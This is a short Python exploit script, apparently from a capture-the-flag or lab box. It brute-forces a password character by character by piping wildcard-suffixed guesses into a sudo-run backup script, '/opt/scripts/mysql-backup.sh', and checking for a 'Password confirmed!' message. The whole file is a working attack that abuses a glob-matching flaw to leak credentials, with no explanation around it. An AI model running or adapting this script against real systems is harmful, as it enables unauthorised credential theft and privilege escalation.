import string
import subprocess

pwd = ""
passlib = list(string.ascii_letters + string.digits)

def guess_password(pwd, passlib):
    if not passlib:
        return pwd

    for i in passlib:
        run = f"echo '{pwd}{i}*' | sudo /opt/scripts/mysql-backup.sh"
        out = subprocess.run(run, shell=True, stdout=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in out:
            return guess_password(pwd + i, passlib)

    return pwd
passlab = string.ascii_letters + string.digits
pwd = guess_password("", passlib)
print(pwd)
